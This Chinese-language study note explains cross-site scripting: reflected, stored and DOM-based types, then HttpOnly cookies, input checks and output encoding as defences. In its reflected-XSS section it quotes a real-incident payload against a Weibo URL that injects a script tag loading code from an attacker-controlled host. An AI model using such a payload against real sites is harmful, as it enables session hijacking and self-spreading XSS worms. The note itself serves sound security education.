# XSS 攻击

标签（空格分隔）： 安全

---
`XSS`, 即 `Cross Site Script`, 中译是跨站脚本攻击;其原本缩写是 `CSS`, 但为了和层叠样式表`CSS`有所区分,因而在安全领域叫做`XSS`

`XSS` 攻击是指攻击者在网站上注入恶意的客户端代码,通过恶意脚本对客户端网页进行篡改,从而在用户浏览网页是,对用户流浪器进行控制或者获取用户隐私数据的一种攻击方式.

攻击者对客户端网页注入的恶意脚本一般包括`JavaScript`, 有时也会包括`HTML`和`flash`,有很多方式进行`XSS`攻击,但它们的共同点为: 将一些隐私数据像`cookie`,`session`发送和攻击者,将受害者重定向到一个由攻击者控制的网站, 在受害者的机器上进行一些恶意操作.

可以分为3类: 反射型(非持久型), 存储型(持久型), 基于DOM

### 反射型
反射型`XSS`的攻击步骤:
1. 攻击者构造出特殊的 URL，其中包含恶意代码。
2. 用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。
3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

由于需要用户主动打开恶意的`URL` 才能生效, 攻击者往往会结合多种手段诱导用户点击

#### 具体的案例: 新浪微博名人堂反射型 XSS 漏洞
攻击者发现 `http://weibo.com/pub/star/g/xyyyd` 这个 `URL` 的内容未经过滤直接输出到 `HTML` 中。于是攻击者构建出一个 `URL`，然后诱导用户去点击：
`http://weibo.com/pub/star/g/xyyyd"><script src=//xxxx.cn/image/t.js></script>`
用户点击这个 `URL` 时，服务端取出请求 `URL`，拼接到 `HTML` 响应中：
`<li><a href="http://weibo.com/pub/star/g/xyyyd"><script src=//xxxx.cn/image/t.js></script>">按分类检索</a></li>`
复制代码浏览器接收到响应后就会加载执行恶意脚本 `//xxxx.cn/image/t.js`，在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作，发出的微博和私信可再带上攻击 `URL`，诱导更多人点击，不断放大攻击范围。这种窃用受害者身份发布恶意内容，层层放大攻击范围的方式，被称为“`XSS` 蠕虫”。

### 存储型
存储型 `XSS`的攻击步骤:
1. 攻击者将恶意代码提交到目标网站的数据库中。
2. 用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。
3. 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作

这种攻击常见于带有用户保存数据的网站功能,如论坛发帖,商品评论,用户私信

#### 具体案例:
类式博客评论咯, 黑客把脚本代码传上去服务端, 当其他用户登录时,服务器返回的评论中,包含黑客的脚本代码,就会在其他用户的环境下执行, 获取用户隐私信息之类.

### DOM 型
`DOM` 型 `XSS` 攻击步骤:
1. 攻击者构造出特殊的 URL，其中包含恶意代码。
2. 用户打开带有恶意代码的 URL。
3. 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。
4. 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

#### 具体案例:
用户通过 `input` 框之类的注入`链接式(包含js脚本)`的`DOM`节点,当点击该节点时,运行脚本,产生破坏.

____
### `XSS` 攻击的规范

#### 1. `HttpOnly` 防止劫取 `CooKie`
`HttpOnly` 最早由微软提出，至今已经成为一个标准。浏览器将禁止页面的`Javascript` 访问带有 `HttpOnly` 属性的`Cookie`。
攻击者可以通过注入恶意脚本获取用户的 `Cookie` 信息。通常 `Cookie` 中都包含了用户的登录凭证信息，攻击者在获取到 `Cookie` 之后，则可以发起 `Cookie` 劫持攻击。所以，严格来说，`HttpOnly` 并非阻止 `XSS` 攻击，而是能阻止 `XSS` 攻击后的 `Cookie` 劫持攻击。

#### 2. 输入检查
不要相信用户的任何输入。 对于用户的任何输入要进行检查、过滤和转义。建立可信任的字符和 HTML 标签白名单，对于不在白名单之列的字符或者标签进行过滤或编码

#### 3. 输出检查
用户的输入会存在问题，服务端的输出也会存在问题。一般来说，除富文本的输出外，在变量输出到 `HTML` 页面时，可以使用编码或转义的方式来防御 XSS 攻击。